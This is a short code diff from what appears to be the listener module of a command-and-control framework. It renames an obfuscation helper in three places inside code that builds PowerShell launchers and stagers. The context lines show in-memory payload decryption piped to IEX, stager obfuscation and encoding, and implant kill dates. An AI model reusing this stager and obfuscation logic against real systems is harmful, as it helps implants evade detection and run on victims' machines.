@@ -460,7 +460,7 @@ class Listener(object):
                 launcherBase += helpers.randomize_capitalization("-join[Char[]](& $R $"+vData+" ($IV+$K))|IEX")
 
                 if obfuscate:
-                    launcherBase = helpers.obfuscate(self.mainMenu.installPath, launcherBase, obfuscationCommand=obfuscationCommand)
+                    launcherBase = data_util.obfuscate(self.mainMenu.installPath, launcherBase, obfuscationCommand=obfuscationCommand)
 
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                     return helpers.powershell_launcher(launcherBase, launcher)
@@ -650,7 +650,7 @@ class Listener(object):
                         randomizedStager += line
 
             if obfuscate:
-                randomizedStager =  helpers.obfuscate(self.mainMenu.installPath, randomizedStager, obfuscationCommand=obfuscationCommand)
+                randomizedStager = data_util.obfuscate(self.mainMenu.installPath, randomizedStager, obfuscationCommand=obfuscationCommand)
 
             if encode:
                 return helpers.enc_powershell(randomizedStager)
@@ -739,7 +739,7 @@ class Listener(object):
             if killDate != "":
                 code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
             if obfuscate:
-                code = helpers.obfuscate(self.mainMenu.installPath, code, obfuscationCommand=obfuscationCommand)
+                code = data_util.obfuscate(self.mainMenu.installPath, code, obfuscationCommand=obfuscationCommand)
             return code
 
         elif language == 'python':
